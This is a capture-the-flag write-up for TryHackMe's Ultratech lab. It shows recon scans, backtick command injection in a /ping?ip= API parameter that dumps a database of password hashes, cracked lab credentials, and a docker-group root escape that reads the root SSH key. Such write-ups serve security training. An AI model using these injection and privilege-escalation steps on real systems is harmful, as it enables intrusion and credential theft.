---
title: Ultratech
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Ultratech
  machine on TryHackMe.
slug: ultratech
---




```

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

```

```
gobuster dir -u http://10.64.182.18:8081 -w /usr/share/dirb/wordlists/common.txt

/ping                 (Status: 500) [Size: 1094]
/auth                 (Status: 200) [Size: 39]

```

```
gobuster dir -u http://10.64.182.18:31331 -w /usr/share/dirb/wordlists/common.txt

/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/css                  (Status: 301) [Size: 319] [--> http://10.64.182.18:31331/css/]
/favicon.ico          (Status: 200) [Size: 15086]
/images               (Status: 301) [Size: 322] [--> http://10.64.182.18:31331/images/]
/index.html           (Status: 200) [Size: 6092]
/javascript           (Status: 301) [Size: 326] [--> http://10.64.182.18:31331/javascript/]
/js                   (Status: 301) [Size: 318] [--> http://10.64.182.18:31331/js/]
/robots.txt           (Status: 200) [Size: 53]
/server-status        (Status: 403) [Size: 280]

```

```
curl http://10.64.182.18:31331/js/api.js
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
        return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
        const req = new XMLHttpRequest();
        try {
            const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
            req.open('GET', url, true);
            req.onload = function (e) {
                if (req.readyState === 4) {
                    if (req.status === 200) {
                        console.log('The api seems to be running')
                    } else {
                        console.error(req.statusText);
                    }
                }
            };
            req.onerror = function (e) {
                console.error(xhr.statusText);
            };
            req.send(null);
        }
        catch (e) {
            console.error(e)
            console.log('API Error');
        }
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();

```

> `http://${getAPIURL()}/ping?ip=${window.location.hostname}`

```
curl http://10.64.182.18:8081/ping?ip=10.64.182.18

PING 10.64.182.18 (10.64.182.18) 56(84) bytes of data. 64 bytes from 10.64.182.18: icmp_seq=1 ttl=64 time=0.047 ms --- 10.64.182.18 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.047/0.047/0.047/0.000 ms

```

```
http://10.64.182.18:8081/ping?ip=`ls`

ping: utech.db.sqlite: Name or service not known

```

```
http://10.64.182.18:8081/ping?ip=`cat%20utech.db.sqlite`

ping: ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Name or service not known

```

```
echo 'ping: ) ␂␏�␏�␏�(␂␄␕M␈r00tf357a0c52799563c7c7b76c1e7543a32)␁␄␗M␈admin0d0ea5111e3c1def594c1684e3b9be84:' | strings

ping: ) 
r00tf357a0c52799563c7c7b76c1e7543a32)
admin0d0ea5111e3c1def594c1684e3b9be84:

```

> `root-n100906`
> `admin-mrsheafy`

```
r00t@ip-10-64-182-18:/home/www/api$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)

```

> You can find the entry GTFOBins

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

fail but

docker ps -a
docker run -v /:/mnt --rm -it bash chroot /mnt sh
sed -n 2p id_rsa | cut -c 1-9


```